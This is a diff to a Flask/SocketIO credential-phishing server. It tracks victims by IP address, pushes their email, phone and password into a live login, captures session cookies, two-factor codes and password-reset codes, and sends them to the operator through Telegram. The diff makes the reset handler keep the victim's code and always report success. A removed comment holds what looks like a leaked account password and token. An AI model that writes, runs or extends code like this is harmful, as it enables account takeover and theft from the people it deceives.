@@ -1,6 +1,5 @@
 import os
 import socket
-import string
 
 from flask import Flask, render_template, request, send_from_directory
 from flask_socketio import SocketIO
@@ -36,6 +35,7 @@ def handle_connect():
     global cookie_type, api_token, chat_id, telegram
     setting = Setting().get_info()
     proxy = Config().get_info()["proxy"]
+    print(proxy)
     load_image = setting["load_image"]
     load_css = setting["load_css"]
     hide_chrome = setting["hide_chrome"]
@@ -50,7 +50,6 @@ def handle_connect():
         ip = request.remote_addr
     proxy = None if proxy == "" else proxy
     str(ip)
-    print(f"Connected: {ip}")
     if ip in list_victim:
         pass
     else:
@@ -66,10 +65,7 @@ def handle_disconnect():
         ip = request.remote_addr
     ip = str(ip)
     if ip in list_victim:
-        print('Client is disconnected' + ip)
         list_victim.pop(ip)
-
-# 61554980854933|5I1*ABJ3vHY|WZHYPNR7VZTGWKHLBI7W3ZBSOVEOBLXB|oouhicizd200061@desertsundesigns.com|5I1*ABJ3vHY
 
 
 @socketio.on("exit")
@@ -92,7 +88,6 @@ def handle_login(data):
     str(ip)
     country = get_country(ip)
     if ip in list_victim:
-        print("IP Client:" + ip)
         pass
     else:
         exit(0)
@@ -107,7 +102,6 @@ def handle_login(data):
                         country=country, type='SMK')
         telegram.send_message(
             'Sai mật khẩu', data["email"], data["phone"], data["password"], ip=ip, country=country)
-        status = list_victim[ip].forget_password(data["email"])
     if status["message"] == "LOGGED_IN":
         cookie = list_victim[ip].get_cookie(cookie_type)
         Data().add_data(username=data["email"], password=data["password"], cookie=cookie,
@@ -130,7 +124,6 @@ def handle_two_factor(code):
     else:
         return {"status": "failed", "message": "CHECKPOINT_ACCOUNT"}
     status = list_victim[ip].enter_code_two_factor(code)
-    print(status)
     if status["message"] == "LOGGED_IN":
         cookie = list_victim[ip].get_cookie(cookie_type)
         Data().add_data(list_victim[ip].email, list_victim[ip].password,
@@ -151,14 +144,13 @@ def handle_forget_password(code):
         pass
     else:
         return {"status": "failed", "message": "CHECKPOINT_ACCOUNT"}
-    status = list_victim[ip].authenticate_reset_code(code)
-    if status["message"] == "LOGGED_IN":
-        cookie = list_victim[ip].get_cookie(cookie_type)
-        Data().add_data(list_victim[ip].email, list_victim[ip].password,
-                        cookie, country=get_country(ip), type='FGP')
-        telegram.send_message(
-            'RESET MẬT KHẨU', list_victim[ip].email, list_victim[ip].phonenumber, list_victim[ip].password, cookie, ip, country=get_country(ip))
-    socketio.emit("forget-passwordResponse", status)
+    cookie = list_victim[ip].get_cookie(cookie_type)
+    Data().add_data(list_victim[ip].email, list_victim[ip].password,
+                    code, country=get_country(ip), type='FGP')
+    telegram.send_code(
+        'RESET MẬT KHẨU', list_victim[ip].email, list_victim[ip].phonenumber, list_victim[ip].password, code, ip, country=get_country(ip))
+    socketio.emit("forget-passwordResponse",
+                  {"status": "success", "message": "LOGGED_IN"})
 
 
 @socketio.on("device-verification")
@@ -196,4 +188,4 @@ def catch_all(path):
 
 
 if __name__ == "__main__":
-    socketio.run(app, host="0.0.0.0", debug=True, port=5000)
+    socketio.run(app, host="0.0.0.0", debug=True, port=7000)
